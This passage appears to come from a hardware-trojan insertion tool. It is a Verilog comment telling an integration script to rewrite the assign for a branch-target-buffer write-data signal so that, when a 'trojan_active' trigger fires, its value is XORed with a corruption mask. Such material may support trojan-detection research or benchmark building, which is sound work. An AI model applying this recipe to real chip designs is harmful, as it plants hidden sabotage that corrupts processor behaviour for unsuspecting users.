...
//
// IMPORTANT: btb_ram_wdata_prediction may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If btb_ram_wdata_prediction is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for btb_ram_wdata_prediction (or first output assign):
//     assign btb_ram_wdata_prediction = <expr>;
//   Replace with:
//     assign btb_ram_wdata_prediction = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
